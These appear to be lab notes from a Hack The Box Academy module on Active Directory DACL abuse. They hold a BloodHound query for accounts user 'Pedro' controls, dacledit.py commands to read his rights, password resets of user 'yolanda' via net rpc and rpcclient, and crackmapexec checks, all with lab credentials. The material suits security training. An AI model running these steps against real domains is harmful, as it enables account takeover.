
---
---
## Identifying Vulnerable Accounts

We can use `BloodHound` to identify if we have those access rights. Using a Cypher query, let us search for `Pedro`, and whether he has `ForceChangePassword`, `GenericAll` or `AllExtendedRights` over any account:

```cypher
MATCH p=((n:User {name:"PEDRO@INLANEFREIGHT.LOCAL"})-[r:ForceChangePassword|GenericAll|AllExtendedRights]->(m)) RETURN p
```

![pedro_passwordAttacks.jpg](https://academy.hackthebox.com/storage/modules/219/pedro_passwordAttacks.jpg)

#### Querying Pedro's DACL over yolanda

```bash
python3 examples/dacledit.py -principal pedro -target yolanda -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```

#### Querying Pedro's DACL over htb-test

```bash
python3 examples/dacledit.py -principal pedro -target htb-test -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
#### Querying Pedro's DACL over joshua

```bash
python3 examples/dacledit.py -principal pedro -target joshua -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
## Abusing PasswordReset From Linux

> Validating the Credentials

```bash
poetry run crackmapexec ldap 10.129.205.81 -u yolanda -p Mynewpassword1
```

> Password Reset with net

```shell
net rpc password yolanda Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```

> Validating the Credenatils

```shell
poetry run crackmapexec ldap 10.129.205.81 -u yolanda -p Mynewpassword1
```

> Password Reset with rpcclient

```shell
rpcclient -U INLANEFREIGHT/pedro%SecuringAD01 10.129.205.81
```

> Validating the Credentials

```shell
poetry run crackmapexec ldap 10.129.205.81 -u yolanda -p Mynewpassword2
```

---
---
